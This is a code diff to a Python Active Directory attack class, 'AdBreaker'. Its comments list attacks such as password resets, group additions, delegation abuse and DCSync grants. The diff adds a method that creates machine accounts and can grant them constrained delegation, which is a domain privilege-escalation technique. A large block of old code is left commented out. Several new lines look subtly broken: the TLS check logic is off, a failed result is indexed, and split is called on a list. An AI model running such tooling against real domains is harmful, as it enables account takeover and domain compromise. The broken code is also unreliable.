@@ -24,6 +24,7 @@ from functools import reduce
 # attacks
 # * reset password - done
 # * add to group - done
+# * create user - done
 # * add a computer
 # * write to computer object Resource Based Constrained Delegation - done
 # * grant DCSync perms to user
@@ -381,10 +382,9 @@ class AdBreaker:
 
 
     def reset_password(self, dn: str, password: str):
+        if not self.ssl or self.start_tls or self.client_cert_file:
+            self.logger.warning('Connection is not via TLS, password reset likely to fail')
         return self.modify_record(dn, {'unicodePwd': [(MODIFY_REPLACE, [self._encode_password(password)])]})
-
-
-
 
 
     # pwdlastset to 0 to force pwd change
@@ -414,6 +414,115 @@ class AdBreaker:
             return results
         else:
             return self.connection.result
+
+
+
+    def add_computer(self, dn:str, computername: str, password: str, constrained_delegations: list=[]):
+
+        
+        ## Default computer SPNs
+        spns = [
+        #    'HOST/%s' % computerHostname,
+        #    'HOST/%s.%s' % (computerHostname, self.__domain),
+        #    'RestrictedKrbHost/%s' % computerHostname,
+        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
+        ]
+
+        attributes = {
+        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
+            'userAccountControl': 0x1000,
+            'servicePrincipalName': spns,
+        #    'sAMAccountName': self.__computerName,
+            'unicodePwd': self._encode_password(password)
+        }
+        
+        # Add constrained delegations fields to the computer
+        if constrained_delegations and len(constrained_delegations) > 0:
+            # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
+            # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
+            attributes['userAccountControl'] = 0x1000000|0x1000
+            # Set the list of services authorized (format: protocol/FQDNserver)
+            attributes['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
+            self.logger.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)
+
+
+        result = self.add_record(dn, object_class=['top','person','organizationalPerson','user','computer'], attributes=attributes)
+
+        if not result:
+            if result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
+                error_code = int(result['message'].split(':')[0].strip(), 16)
+                if error_code == 0x216D:
+                    raise Exception("User machine quota exceeded!")
+                else:
+                    raise Exception(str(self.ldapConn.result))
+            elif result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+                raise Exception("User doesn't have right to create a machine account!")
+            elif result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
+                raise Exception("User doesn't have right to create constrained delegations!")
+            else:
+                raise Exception(str(result))
+        else:
+            self.logger.info(f'Successfully added machine account {computername} with password {password}.')
+
+
+
+
+        #if self.__computerName is not None:
+        #    if self.LDAPComputerExists(self.ldapConn, self.__computerName):
+        #        raise Exception("Account %s already exists! If you just want to set a password, use -no-add." % self.__computerName)
+        #else:
+        #    while True:
+        #        self.__computerName = self.generateComputerName()
+        #        if not self.LDAPComputerExists(self.ldapConn, self.__computerName):
+        #            break
+
+
+        #computerHostname = self.__computerName[:-1]
+        #computerDn = ('CN=%s,%s' % (computerHostname, self.__computerGroup))
+
+        ## Default computer SPNs
+        #spns = [
+        #    'HOST/%s' % computerHostname,
+        #    'HOST/%s.%s' % (computerHostname, self.__domain),
+        #    'RestrictedKrbHost/%s' % computerHostname,
+        #    'RestrictedKrbHost/%s.%s' % (computerHostname, self.__domain),
+        #]
+        #ucd = {
+        #    'dnsHostName': '%s.%s' % (computerHostname, self.__domain),
+        #    'userAccountControl': 0x1000,
+        #    'servicePrincipalName': spns,
+        #    'sAMAccountName': self.__computerName,
+        #    'unicodePwd': ('"%s"' % self.__computerPassword).encode('utf-16-le')
+        #}
+
+        ## Add constrained delegations fields to the computer
+        #if constrained_delegations and len(constrained_delegations) > 0:
+        #    # Set the TRUSTED_TO_AUTH_FOR_DELEGATION and WORKSTATION_TRUST_ACCOUNT flags
+        #    # MS doc: https://learn.microsoft.com/fr-fr/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
+        #    ucd['userAccountControl'] = 0x1000000|0x1000
+        #    # Set the list of services authorized (format: protocol/FQDNserver)
+        #    ucd['msDS-AllowedToDelegateTo'] = constrained_delegations.split(',') #Split multiple services in the command line
+        #    logging.info("Adding constrained delegations services to the computer object: %s" % constrained_delegations)
+
+        #res = self.ldapConn.add(computerDn, ['top','person','organizationalPerson','user','computer'], ucd)
+        #if not res:
+        #    if self.ldapConn.result['result'] == ldap3.core.results.RESULT_UNWILLING_TO_PERFORM:
+        #        error_code = int(self.ldapConn.result['message'].split(':')[0].strip(), 16)
+        #        if error_code == 0x216D:
+        #            raise Exception("User machine quota exceeded!")
+        #        else:
+        #            raise Exception(str(self.ldapConn.result))
+        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_INSUFFICIENT_ACCESS_RIGHTS:
+        #        raise Exception("User doesn't have right to create a machine account!")
+        #    elif self.ldapConn.result['result'] == ldap3.core.results.RESULT_CONSTRAINT_VIOLATION:
+        #        raise Exception("User doesn't have right to create constrained delegations!")
+        #    else:
+        #        raise Exception(str(self.ldapConn.result))
+        #else:
+        #    logging.info("Successfully added machine account %s with password %s." % (self.__computerName, self.__computerPassword))
+
+
+
 
 
 
